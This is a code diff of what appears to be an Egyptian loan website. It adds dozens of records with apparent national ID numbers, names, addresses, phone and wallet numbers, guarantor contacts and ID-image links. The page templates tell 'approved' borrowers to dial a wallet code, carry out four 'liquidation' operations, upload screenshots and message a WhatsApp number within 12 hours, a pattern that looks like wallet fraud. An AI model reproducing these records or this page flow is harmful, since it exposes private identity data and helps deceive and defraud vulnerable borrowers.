+    loan: 150000,
+    loanTerm: "48 شهر",
+    installment: "4205",
+    total: "201840 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01282128864",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/j2c62Xz5/21-16-inbound5800651662608650368.jpg",
+    guarantor: { name: "احمد اسماعيل حسن فرج الله نعمان", relation: "ابن", phone: "0121473543" },
+    address: "28 ش عبدالله النديم محرم بك - الإسكندرية"
+  },
+  "28709261700055": {
+    id: "28709261700055",
+    name: "احمد ابراهيم عبدالعظيم محمد",
+    job: "مسئول أول ائتمان",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01002051998",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/2j9VkMWb/19-16-inbound836596920410636358.jpg",
+    guarantor: { name: "اخلاص السيد صابر مختار", relation: "زوجة", phone: "01092752844" },
+    address: "ش بين الكوم - المنوفية"
+  },
+  "28601232400837": {
+    id: "28601232400837",
+    name: "محمد طه محمد سليمان",
+    job: "عامل في شركة النساجون الشارقون",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01019003262",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/QMjXkJ5Z/11-16-inbound923295521363807707.jpg",
+    guarantor: { name: "رشا طه محمد سليمان", relation: "أخت", phone: "01050677042" },
+    address: "العاشر من رمضان - الشرقية"
+  },
+  "28109082701963": {
+    id: "28109082701963",
+    name: "فاطمة محمد الصادق إبراهيم",
+    job: "وريثة معاش قوات مسلحة",
+    loan: 100000,
+    loanTerm: "32 شهر",
+    installment: "4157",
+    total: "133024 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01004832454",
+    status: "approved",
+    idVerificationImage: "https://pdftourl.net/images/1789900455941-64055739-9cda-4633-ad43-d23c44217084.jpg",
+    guarantor: { name: "عمر على لبيب حسين", relation: "زوج", phone: "01022897235" },
+    address: "جنوب سيناء - دهب - المدينة ع4 بجوار موقف شرق الدلتا"
+  },
+  "29304282401132": {
+    id: "29304282401132",
+    name: "ايمن صلاح رجب محمد",
+    job: "سكرتير في عيادة",
+    loan: 80000,
+    loanTerm: "30 شهر",
+    installment: "3550",
+    total: "106500 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01114184065",
+    status: "approved",
+    idVerificationImage: "https://pdftourl.net/images/1789901497804-d0a60620-11c1-483f-9f7c-35f7ba3633f8.jpg",
+    guarantor: { name: "غاده احمد عبد العظيم احمد", relation: "زوجة", phone: "01141723690" },
+    address: "المنيا - مركز ملوي"
+  },
+  "29303282703434": {
+    id: "29303282703434",
+    name: "شعبان محمد صلاح محروس عبد المجيد",
+    job: "محامي حر",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "0110282618",
+    status: "approved",
+    idVerificationImage: "https://pdftourl.net/images/1789900879117-c06e4540-feb4-41da-8016-c24de4a2effe.jpg",
+    guarantor: { name: "امل محمد شحات فاوي", relation: "زوجة", phone: "01110969247" },
+    address: "مساكن المظلوم القديمه بلوك 4م1"
+  },
+  "27902111800338": {
+    id: "27902111800338",
+    name: "عبدالحميد سعيد رمضان ابوشناف",
+    job: "شغال بشركة سينوريتا للصناعات الغذائية بالمخازن",
+    loan: 125000,
+    loanTerm: "38 شهر",
+    installment: "4035",
+    total: "153330 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01035151170",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/rw0Ckt5J/IMG-20260920-163355.jpg",
+    guarantor: { name: "دعاء عبده عبدالوهاب بدري", relation: "زوجة", phone: "01032535430" },
+    address: "الدرمللي تبع منشأة ناصر - دمنهور - البحيرة"
+  },
+  "27109170103011": {
+    id: "27109170103011",
+    name: "عمرو فاضل حسين عماره",
+    job: "فني تشغيل وزارة الثقافة صندوق التنمية الثقافية",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01124762321",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/tTZY1h4J/10-16-inbound4292954775920867295.jpg",
+    guarantor: { name: "سماح شعبان ابراهيم سالم", relation: "زوجة", phone: "01148185747" },
+    address: "7ش الخارطة الجديدة الزهراء - مصر القديمة - القاهرة"
+  },
+  "29507150200772": {
+    id: "29507150200772",
+    name: "محمود عبد المنعم محمود محمد",
+    job: "مندوب مبيعات",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01287004350",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/52YGRyy4/7-16-inbound2506400491977580977.jpg",
+    guarantor: { name: "غير مسجل", relation: "أخت", phone: "01551353444" },
+    address: "٣٢ شارع الزهراء العصافرة قبلي أول المنتزه - الإسكندرية"
+  },
+  "28309062102299": {
+    id: "28309062102299",
+    name: "أحمد محمد عبد الغفار عبد الحفيظ",
+    job: "عامل بوفيه بمصنع شربات",
+    loan: 50000,
+    loanTerm: "24 شهر",
+    installment: "2725",
+    total: "65400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01007312353",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/hvYxPw37/15-16-inbound4291426505243579400.jpg",
+    guarantor: { name: "فتحي محمد عبد الغفار عبد الحفيظ", relation: "أخت", phone: "01125086720" },
+    address: "أوسيم شارع درب عبد الاله"
+  },
+  "29001011422981": {
+    id: "29001011422981",
+    name: "ايناس صابر يوسف فرح",
+    job: "تاجرة ملابس",
+    loan: 90000,
+    loanTerm: "30 شهر",
+    installment: "3990",
+    total: "119700 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01034143587",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/Qxb0yS4T/17-16-inbound1189903481443158774.jpg",
+    guarantor: { name: "حليمة السيد فرح العتاني", relation: "والدة", phone: "01028250873" },
+    address: "الرملة - مركز بنها"
+  },
+  "29111122800216": {
+    id: "29111122800216",
+    name: "محمود عبدالرحمن السمان عبدالرحمن",
+    job: "صناعي تشطيب ديكور المنزل",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01130356014",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/Prw8LqD9/16-16-inbound3083029038306914280.jpg",
+    guarantor: { name: "امنه عبدالباسط احمد حمزه", relation: "والدة", phone: "01104285824" },
+    address: "أسوان - ادقو العدوه"
+  },
+  "28904210102827": {
+    id: "28904210102827",
+    name: "نهلة عبد المجيد احمد عبد المجيد",
+    job: "تفصيل وبيع جاهز ملابس ومفروشات",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01284123259",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/SK3hzmCc/21-16-inbound8437198349515085497.jpg",
+    guarantor: { name: "ايات عبد المجيد احمد عبد المجيد", relation: "أخت", phone: "01284238181" },
+    address: "1 ش عبد العال احمد من ش المنشيه - ميدان الساعه - طلبيه فيصل"
+  },
+  "28002060100282": {
+    id: "28002060100282",
+    name: "فتحية طه احمد عبد العزيز فايد",
+    job: "مساعدة تمريض",
+    loan: 45000,
+    loanTerm: "18 شهر",
+    installment: "3325",
+    total: "59850 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01143466854",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/kGwYKyLG/22-16-inbound4283203867089269883.jpg",
+    guarantor: { name: "مؤمن محمد عبد النبي حموده", relation: "ابن", phone: "01032075362" },
+    address: "الاسكان الصناعي شبرا الخيمة 13"
+  },
+  "27306062100951": {
+    id: "27306062100951",
+    name: "محمد سيد عبد الحفيظ رفاعي",
+    job: "شركة التعاون للبترول - المسؤول الوظيفي مدار إدارة",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01113264306",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/3JZYJZDz/Screenshot-2026-09-21-17-49-32-78-a23b203fd3aafc6dcb84e438dda678b6.jpg",
+    guarantor: { name: "مصطفى محمد سيد عبد الحفيظ", relation: "ابن", phone: "01103202053" },
+    address: "الجيزة الهرم - ش 13 شارع خالد بن الوليد"
+  },
+  "29704252500797": {
+    id: "29704252500797",
+    name: "ابانوب سامي عبدالله مني",
+    job: "مقاولات جبس - مورد",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01279887935",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/rmYdD3y5/51-17-inbound6282945152799696761.jpg",
+    guarantor: { name: "نسمه ابراهيم راشد عبد السيد", relation: "زوجة", phone: "01223618490" },
+    address: "القليوبيه - الخصوص - شارع جمال عبد الناصر"
+  },
+  "29111102104892": {
+    id: "29111102104892",
+    name: "احمد سيد محمد احمد فراج محمد احمد فراج",
+    job: "موظف حكومي",
+    loan: 150000,
+    loanTerm: "48 شهر",
+    installment: "4205",
+    total: "201840 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01116052419",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "ساره احمد عبد الحكيم", relation: "زوجة", phone: "01090406125" },
+    address: "65 شارع رفعت الخرطه الجديد - الجيزة - جانب شركة سول السياحة"
+  },
+  "29508032700503": {
+    id: "29508032700503",
+    name: "اميره محمد عبدالصبور حسن على",
+    job: "ربة منزل",
+    loan: 30000,
+    loanTerm: "12 شهر",
+    installment: "3325",
+    total: "39900 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01132624554",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "مصطفى محمود سايح عبدالرحيم", relation: "زوج", phone: "01022258179" },
+    address: "محافظة قنا - مركز دشنا - المدينة السكنية بمصنع سكر دشنا"
+  },
+  "29802101201315": {
+    id: "29802101201315",
+    name: "اسلام أسامه عبد الهادي راجح",
+    job: "تجارة في المكن اللوط",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01060525458",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/3NMBq1Tk/7-16-inbound3528414821944310925.jpg",
+    guarantor: { name: "نبيه محمد الشحات يوسف", relation: "زوجة", phone: "01559910226" },
+    address: "كفر أبو سيد أحمد - مركز شربين - الدقهلية"
+  },
+  "29410010217094": {
+    id: "29410010217094",
+    name: "اسلام فايز رجب محمود",
+    job: "محاسب",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01271648233",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/HxdRNT9G/8-16-27A776B1-C114-46AA-97CC-BB739181FD96.jpg",
+    guarantor: { name: "مهاب", relation: "زوج", phone: "01555221564" },
+    address: "الإسكندرية"
+  },
+  "30201012412959": {
+    id: "30201012412959",
+    name: "عبدالله شعبان ناصر طلب",
+    job: "شغال في سوبر ماركت",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01004893861",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/qvgmDjhD/15-16-inbound6157651196907867569.jpg",
+    guarantor: { name: "ولاء ناصر خميس غانم", relation: "زوجة", phone: "01142629339" },
+    address: "الجيزة - بولاق الدكرور - شارع عبدالمنعم"
+  },
+  "26906090101061": {
+    id: "26906090101061",
+    name: "هدى سيد محمد احمد",
+    job: "أخصائي شئون إدارية",
+    loan: 50000,
+    loanTerm: "24 شهر",
+    installment: "2725",
+    total: "65400 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01117686954",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/VvnSNyVB/23-16-inbound8014761145520934331.jpg",
+    guarantor: { name: "ياسمين رمضان فؤاد عبد الموجود", relation: "ابنة", phone: "01204258723" },
+    address: "٣٨ شارع الحكيم - مهمشة - الشرابية"
+  },
+  "27805151802711": {
+    id: "27805151802711",
+    name: "حسين شعبان حسين عبيد",
+    job: "سائق حر",
+    loan: 175000,
+    loanTerm: "48 شهر",
+    installment: "4848",
+    total: "232704 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01146574428",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/L8SW5HGJ/24-16-inbound4379315643646967679.jpg",
+    guarantor: { name: "منى إبراهيم عبد المنعم", relation: "زوجة", phone: "01146574427" },
+    address: "ش خطاب سيدى شحاته - كفر الدوار - البحيرة"
+  },
+  "28703182100087": {
+    id: "28703182100087",
+    name: "رشا احمد عبد المعطي أبو العلا",
+    job: "موظفة حي جنوب الجيزة",
+    loan: 70000,
+    loanTerm: "26 شهر",
+    installment: "3585",
+    total: "93210 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01026225699",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/JzGL3311/Screenshot-2026-09-29-18-17-42-14-99c04817c0de5652397fc8b56c3b3817.jpg",
+    guarantor: { name: "فاطمه احمد عبد المعطي أبو العلا", relation: "أخت", phone: "01127155346" },
+    address: "40 شارع عبد العال يوسف - ساقية مكي - الجيزة"
+  },
+  "26804242101855": {
+    id: "26804242101855",
+    name: "ثروت عزمى راغب عبود",
+    job: "سايق أوبر مع عربية",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01070294328",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "ماهر فوزى راغب عبود", relation: "أخ", phone: "01000431822" },
+    address: "أوسيم - بجوار مستشفى أوسيم - الجيزة"
+  },
+  "30207091700571": {
+    id: "30207091700571",
+    name: "محمد مجدي احمد",
+    job: "شيف",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01117461279",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "عبدالرحمن مجدي احمد صالح", relation: "أخ", phone: "01152220547" },
+    address: "الجيزة - شارع فرحات"
+  },
+  "27209171500697": {
+    id: "27209171500697",
+    name: "وائل حسينى مرسى حموده",
+    job: "أخصائي اجتماعى لدى منشأة",
+    loan: 50000,
+    loanTerm: "24 شهر",
+    installment: "2725",
+    total: "65400 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01147801246",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "منة الله وائل حسينى مرسى", relation: "ابنة", phone: "01033949061" },
+    address: "14 ش البدوى من داير الناحية - الإسماعيلية"
+  },
+  "26503011100767": {
+    id: "26503011100767",
+    name: "بسيمه سعد محمد سلامه",
+    job: "كبير معلمين بالمعاش",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01093752935",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "رياض حسن على سالم ابو العيله", relation: "زوج", phone: "01226484494" },
+    address: "دمياط الجديدة - شارع الإمارات - بجوار مسجد نور"
+  },
+  "28202182403552": {
+    id: "28202182403552",
+    name: "جوزيف مختار شوقي ابواليمين",
+    job: "فني صيانة خطوط شبكات المنيا",
+    loan: 150000,
+    loanTerm: "48 شهر",
+    installment: "4205",
+    total: "201840 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01006132806",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "مختار شوقي ابواليمين بطرس", relation: "أب", phone: "01220099530" },
+    address: "٢٠ شارع الحرمين - حى مكه - أبوهلال - المنيا"
+  },
+  "27005232500798": {
+    id: "27005232500798",
+    name: "رمزى فتحى جورجى عبدالملاك",
+    job: "مخزن خردة حديد",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01145154294",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "حلاوتهم فايز بخيت بشاى", relation: "زوجة", phone: "01272000952" },
+    address: "٣ ش محمد ابرهيم - عزبة العرب - أرض اللواء"
+  },
+  "27710060201942": {
+    id: "27710060201942",
+    name: "نسرين كمال عبد الفتاح احمد",
+    job: "صاحبة نشاط تجارى",
+    loan: 50000,
+    loanTerm: "24 شهر",
+    installment: "2725",
+    total: "65400 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01115792959",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "ايمن محمد عبد المنعم سراج الدين", relation: "زوج", phone: "01115792959" },
+    address: "شارع ربيع متفرع من المعهد - العصافرة"
+  },
+  "30302282800064": {
+    id: "30302282800064",
+    name: "اسماء سمير احمد محمد",
+    job: "موظفة استقبال",
+    loan: 35000,
+    loanTerm: "12 شهر",
+    installment: "3875",
+    total: "46500 ج.م",
+    hasEtisalat: true,
+    hasVodafone: false,
+    wallet: "اتصالات كاش",
+    walletNum: "01151092352",
+    status: "approved",
+    idVerificationImage: "https://i.postimg.cc/GpCmL9vQ/42-16-20260927-222213.jpg",
+    guarantor: { name: "شوقيه مسلم محمد بدر", relation: "والدة", phone: "01101944908" },
+    address: "السيل الريفي - شرق مستشفى الصدر"
+  },
+  "30308080201159": {
+    id: "30308080201159",
+    name: "يوسف ايمن محمد عبد المنعم",
+    job: "شركة توزيع منتجات",
+    loan: 40000,
+    loanTerm: "18 شهر",
+    installment: "2965",
+    total: "53370 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01080362122",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "نسرين كمال عبد الفتاح احمد", relation: "والدة", phone: "01557709292" },
+    address: "360 ش الملك حفني - عصافرة بحري - السكة"
+  },
+  "27307240200619": {
+    id: "27307240200619",
+    name: "عمرو علي حسن علي",
+    job: "مشرف بشركة ليسيكو مصر",
+    loan: 200000,
+    loanTerm: "60 شهر",
+    installment: "4440",
+    total: "266400 ج.م",
+    hasEtisalat: false,
+    hasVodafone: false,
+    wallet: "محفظة أخرى",
+    walletNum: "01555742473",
+    status: "approved",
+    idVerificationImage: "",
+    guarantor: { name: "فرح عمرو علي حسن", relation: "ابنة", phone: "01159462839" },
+    address: "الإسكندرية - ١ شارع الناضورى - راس التين - الجمرك"
+  },
+  "27501171701059": {
+  name: "محمد نادي محمدى محمد",
+  job: "مشرف قسم صيانة كهرباء في شركة العربي",
+  loan: 150000,
+  wallet: "محفظة أخرى",
+  walletNum: "01027007607",
+  status: "active",
+  idVerificationImage: "",
+  guarantor: { name: "اسماء عبد الرازق محمدى محمد", relation: "زوجة", phone: "01110331940" }
+},
+"29311271202517": {
+  name: "محمد رمضان إبراهيم المناوي",
+  job: "مصنع حلويات الزهور",
+  loan: 35000,
+  wallet: "محفظة أخرى",
+  walletNum: "01040715595",
+  status: "active",
+  idVerificationImage: "",
+  guarantor: { name: "مني أحمد الغريب النوساني", relation: "والدة", phone: "01283350843" }
+},
+"27609131100147": {
+  name: "داليا التابعي حسن ابو حجازي",
+  job: "أعمل في مجال العطارة",
+  loan: 70000,
+  wallet: "محفظة أخرى",
+  walletNum: "01092671370",
+  status: "active",
+  idVerificationImage: "",
+  guarantor: { name: "تفيده طاهر محمد اللضام", relation: "والدة", phone: "01019377187" }
+},
+"29101011212077": {
+  id: "29101011212077",
+  name: "السيد محمد محمد محمد",
+  job: "مدير مخازن",
+  loan: 50000,
+  loanTerm: "24 شهر",
+  installment: "2725",
+  total: "65400 ج.م",
+  hasEtisalat: true,
+  hasVodafone: false,
+  wallet: "اتصالات كاش",
+  walletNum: "01132745677",
+  status: "approved",
+  idVerificationImage: "",
+  guarantor: { name: "عمر محمد محمد محمد", relation: "أخ", phone: "01116683146" },
+  address: "جصفا - مركز ميت غمر - الدقهلية"
+}
+};
 
   let currentClient = null;
 
@@ -268,12 +1527,7 @@
   }
 
   function buildLoanCard(client, totalDisplay) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    let walletDisplay;
-    if (hasEtisalat) walletDisplay = "📱 اتصالات كاش";
-    else if (hasVodafone) walletDisplay = "📱 فودافون كاش";
-    else walletDisplay = "📱 " + (client.wallet || "غير محددة");
+    const walletDisplay = client.hasEtisalat ? "📱 اتصالات كاش" : (client.wallet || "⚠️ غير محددة");
     return `
       <div class="loan-card">
         <div class="loan-label">💰 مبلغ التمويل المعتمد</div>
@@ -281,8 +1535,8 @@
         <div class="loan-percent"><i class="fas fa-circle-check"></i> ✅ تمت الموافقة النهائية 100%</div>
         <div class="loan-details-grid">
           <div class="detail-item"><div class="label">💰 المبلغ</div><div class="value gold">${client.loan.toLocaleString('ar-EG')} ج.م</div></div>
-          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm || "—"}</div></div>
-          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment || "—"} ج.م</div></div>
+          <div class="detail-item"><div class="label">📅 المدة</div><div class="value">${client.loanTerm}</div></div>
+          <div class="detail-item"><div class="label">💵 القسط الشهري</div><div class="value gold">${client.installment} ج.م</div></div>
           <div class="detail-item"><div class="label">💳 الإجمالي</div><div class="value">${totalDisplay}</div></div>
           <div class="detail-item"><div class="label">📱 المحفظة</div><div class="value green">${walletDisplay}</div></div>
           <div class="detail-item"><div class="label">🔢 رقم المحفظة</div><div class="value">${client.walletNum || "—"}</div></div>
@@ -311,12 +1565,7 @@
   }
 
   function buildClientDetails(client) {
-    const hasEtisalat = client.hasEtisalat || false;
-    const hasVodafone = client.hasVodafone || false;
-    let walletDisplay;
-    if (hasEtisalat) walletDisplay = "اتصالات كاش";
-    else if (hasVodafone) walletDisplay = "فودافون كاش";
-    else walletDisplay = client.wallet || "غير محددة";
+    const walletDisplay = client.hasEtisalat ? "اتصالات كاش" : (client.wallet || "غير محددة");
     return `
       <div class="client-info">
         <div class="info-title"><i class="fas fa-user-circle"></i> 👤 بيانات العميل</div>
@@ -336,9 +1585,7 @@
     const perOperation = Math.floor(loanAmountNum / 4);
     const perOpFormatted = perOperation.toLocaleString('ar-EG');
     const totalFormatted = (perOperation * 4).toLocaleString('ar-EG');
-    const hasVodafone = client.hasVodafone || false;
-    const walletCode = hasVodafone ? '#100*9*' : '*777*6#';
-    const walletName = hasVodafone ? 'فودافون كاش' : 'اتصالات كاش';
+
     return `
       <div class="steps-container">
         <div class="steps-header">
@@ -348,17 +1595,19 @@
             <p>💡 اتبع الخطوات بالترتيب لإتمام إجراءات الصرف</p>
           </div>
         </div>
+
         <div class="code-box">
           <div class="code-label">🔑 كود تفعيل التسييل</div>
-          <div class="code-value">${walletCode}</div>
+          <div class="code-value">*777*6#</div>
           <div class="code-hint">📞 كود تفعيل تسييل الحساب — اتصل به من محفظتك</div>
         </div>
+
         <div class="step-cards">
           <div class="step-card">
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">📞 اطلب كود التفعيل</div>
-              <div class="step-desc">اتصل بالكود <strong>${walletCode}</strong> من خط ${walletName} الخاص بك</div>
+              <div class="step-desc">اتصل بالكود <strong>*777*6#</strong> من خط اتصالات كاش الخاص بك</div>
             </div>
           </div>
           <div class="step-card">
@@ -383,14 +1632,17 @@
             </div>
           </div>
         </div>
+
         <div class="amount-box">
           <div class="amount-label">💰 المبلغ المؤكد لكل عملية</div>
           <div class="amount-value">${perOpFormatted} ج.م</div>
           <div class="amount-sub">💳 إجمالي 4 عمليات = ${totalFormatted} ج.م</div>
         </div>
+
         <button class="btn-upload" onclick="window.open('${SURVEY_URL}','_blank')">
           <i class="fas fa-cloud-arrow-up"></i> 📤 ارفع لقطات التسييل الآن
         </button>
+
         <button class="btn-whatsapp" onclick="openWhatsApp()">
           <i class="fab fa-whatsapp fa-lg"></i> 💬 تواصل مع قسم التحويلات المالية
         </button>
@@ -404,26 +1656,30 @@
         <div class="ow-header">
           <div class="ow-icon"><i class="fas fa-triangle-exclamation"></i></div>
           <div>
-            <h3>⚠️ مطلوب فتح محفظة اتصالات كاش أو فودافون كاش</h3>
+            <h3>⚠️ مطلوب فتح محفظة اتصالات كاش</h3>
             <p>💡 لإتمام إجراءات الصرف</p>
           </div>
         </div>
+
         <div class="ow-body">
           <div class="greeting">💚 عزيزي ${client.name}،</div>
+
           <div class="main-notice">
-            <span class="danger-text">⚠️ نظامنا يخدم محفظة اتصالات كاش أو فودافون كاش فقط.</span><br><br>
+            <span class="danger-text">⚠️ نظامنا حاليًا يخدم محفظة اتصالات كاش فقط.</span><br><br>
             📌 لكي نتمكن من البدء في إنهاء إجراءات التسيل والصرف لحسابك، يجب عليك:<br><br>
-            <strong>📱 فتح محفظة اتصالات كاش أو فودافون كاش مسجلة باسمك</strong> خلال مدة لا تتجاوز <strong>⏰ 12 ساعة</strong> من الآن.<br><br>
-            📞 وبعد فتح المحفظة، قم بإبلاغ قسم التحويلات المالية على واتساب برقم المحفظة الخاص بك ليتم إضافته إلى ملفك الشخصي على السيستم.
+            <strong>📱 فتح محفظة اتصالات كاش مسجلة باسمك</strong> خلال مدة لا تتجاوز <strong>⏰ 12 ساعة</strong> من الآن.<br><br>
+            📞 وبعد فتح المحفظة، قم بإبلاغ قسم التحويلات المالية على واتساب برقم اتصالات الخاص بك ليتم إضافته إلى ملفك الشخصي على السيستم.
           </div>
+
           <div class="ow-timer-note">
             <i class="fas fa-hourglass-half"></i>
             <span>⏰ المدة المتبقية: 12 ساعة من الآن</span>
           </div>
+
           <div class="ow-steps">
             <div class="ow-step">
               <div class="ow-num">1</div>
-              <div>📱 توجه إلى أقرب فرع اتصالات أو فودافون لفتح محفظة كاش.</div>
+              <div>📱 توجه إلى أقرب فرع اتصالات أو استخدم تطبيق <strong>My Etisalat</strong> لفتح محفظة كاش.</div>
             </div>
             <div class="ow-step">
               <div class="ow-num">2</div>
@@ -431,19 +1687,21 @@
             </div>
             <div class="ow-step">
               <div class="ow-num">3</div>
-              <div>📞 بعد فتح المحفظة، أرسل رقم المحفظة عبر واتساب إلى <strong>قسم التحويلات المالية</strong>.</div>
+              <div>📞 بعد فتح المحفظة، أرسل رقم اتصالات الخاص بك عبر واتساب إلى <strong>قسم التحويلات المالية</strong>.</div>
             </div>
             <div class="ow-step">
               <div class="ow-num">4</div>
               <div>🎯 سيتم إضافة الرقم إلى ملفك على السيستم، ثم نبدأ فورًا في <strong>إنهاء إجراءات التسيل والصرف</strong> لك.</div>
             </div>
           </div>
+
           <div class="ow-apology">
             😔 <i class="fas fa-circle-info"></i>
-            نأسف، نظامنا يخدم محفظة اتصالات كاش أو فودافون كاش فقط. وقد تم إبلاغك بذلك في وقت التسجيل.
+            نأسف، نظامنا حاليًا يخدم محفظة اتصالات كاش فقط. وقد تم إبلاغك بذلك في وقت التسجيل.
           </div>
-          <button class="btn-whatsapp" onclick="openWhatsApp('السلام عليكم 👋\\n\\n👤 أنا: ${client.name}\\n🔢 الرقم القومي: ${client.id}\\n\\n📱 لقد قمت بفتح محفظة كاش جديدة كما طُلب مني.\\n🔢 رقم المحفظة الجديد: [اكتب رقمك هنا]\\n\\n🎯 أرغب في إبلاغ قسم التحويلات المالية برقم المحفظة الخاص بي ليتم إضافته إلى ملفي على السيستم والبدء في إنهاء إجراءات التسيل والصرف.\\n\\n🙏 شكرًا.')">
-            <i class="fab fa-whatsapp fa-lg"></i> 📞 إبلاغ قسم التحويلات المالية برقم المحفظة
+
